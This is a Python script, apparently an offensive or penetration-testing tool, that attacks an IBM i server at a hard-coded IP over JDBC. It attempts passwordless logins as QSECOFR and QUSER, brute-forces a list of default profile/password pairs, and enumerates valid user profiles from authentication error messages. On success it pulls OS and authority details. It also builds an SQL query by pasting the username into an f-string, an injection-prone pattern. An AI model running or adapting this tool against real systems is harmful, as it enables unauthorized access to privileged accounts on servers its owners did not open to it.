#!/usr/bin/env python3
import jaydebeapi
import sys
import os

# Configuration
JT400_JAR = "jt400-21.0.6.jar"  # Update path as needed
TARGET = "10.224.56.66"

def test_connection(username, password=""):
    """Test JDBC connection to IBM i"""
    print(f"\n[*] Testing connection to {TARGET} as {username}...")
    
    jdbc_url = f"jdbc:as400://{TARGET}"
    
    try:
        conn = jaydebeapi.connect(
            "com.ibm.as400.access.AS400JDBCDriver",
            jdbc_url,
            [username, password],
            JT400_JAR
        )
        
        print(f"[+] SUCCESS! Connected as {username}")
        
        # Get connection info
        cursor = conn.cursor()
        cursor.execute("SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1")
        result = cursor.fetchone()
        print(f"[+] Database confirms user: {result[0]}")
        
        # Try to get system info
        try:
            cursor.execute("SELECT SYSTEM_VALUE_NAME, CURRENT_VALUE FROM QSYS2.SYSTEM_VALUE_INFO WHERE SYSTEM_VALUE_NAME = 'QOSVRM'")
            result = cursor.fetchone()
            print(f"[+] OS Version: {result[1]}")
        except Exception as e:
            print(f"[!] Could not get OS version: {e}")
        
        # Check user authorities
        try:
            cursor.execute(f"SELECT SPECIAL_AUTHORITIES FROM QSYS2.USER_INFO WHERE USER_NAME = '{username}'")
            result = cursor.fetchone()
            if result and result[0]:
                print(f"[+] Special Authorities: {result[0]}")
        except Exception as e:
            print(f"[!] Could not get authorities: {e}")
        
        cursor.close()
        conn.close()
        return True
        
    except Exception as e:
        print(f"[-] FAILED: {e}")
        return False

def test_default_passwords():
    """Test common IBM i default passwords"""
    profiles = [
        ("QSECOFR", "QSECOFR"),
        ("QSYSOPR", "QSYSOPR"),
        ("QPGMR", "QPGMR"),
        ("QUSER", "QUSER"),
        ("QOPER", "QOPER"),
        ("QSRV", "QSRV"),
    ]
    
    print("\n" + "="*60)
    print("TESTING DEFAULT PASSWORDS")
    print("="*60)
    
    for username, password in profiles:
        if test_connection(username, password):
            print(f"\n[!!!] DEFAULT PASSWORD WORKS: {username}/{password}")
            return True
    
    print("\n[-] No default passwords worked")
    return False

def test_unauthenticated():
    """Test for unauthenticated access (DRDA misconfiguration)"""
    print("\n" + "="*60)
    print("TESTING UNAUTHENTICATED ACCESS")
    print("="*60)
    
    # Try connecting without password
    if test_connection("QSECOFR", ""):
        print("\n[!!!] CRITICAL: UNAUTHENTICATED ACCESS AS QSECOFR!")
        return True
    
    if test_connection("QUSER", ""):
        print("\n[!!!] CRITICAL: UNAUTHENTICATED ACCESS AS QUSER!")
        return True
    
    print("\n[-] Unauthenticated access not possible")
    return False

def enumerate_users():
    """Try to enumerate user profiles (if we have access)"""
    print("\n" + "="*60)
    print("ATTEMPTING USER ENUMERATION")
    print("="*60)
    
    # First try with common credentials
    test_users = ["QSECOFR", "QSYSOPR", "QPGMR", "QUSER", "QOPER", "QSRV", "QDBSHR"]
    
    for user in test_users:
        try:
            conn = jaydebeapi.connect(
                "com.ibm.as400.access.AS400JDBCDriver",
                f"jdbc:as400://{TARGET}",
                [user, user],  # Try user/user
                JT400_JAR
            )
            print(f"[+] Valid credentials found: {user}/{user}")
            conn.close()
        except Exception as e:
            if "password" in str(e).lower() or "authentication" in str(e).lower():
                print(f"[*] User {user} exists (auth failed)")
            else:
                print(f"[-] User {user} - {e}")

if __name__ == "__main__":
    print("IBM i Connection Tester")
    print("Target: " + TARGET)
    
    # Test 1: Unauthenticated access
    test_unauthenticated()
    
    # Test 2: Default passwords
    test_default_passwords()
    
    # Test 3: User enumeration
    enumerate_users()
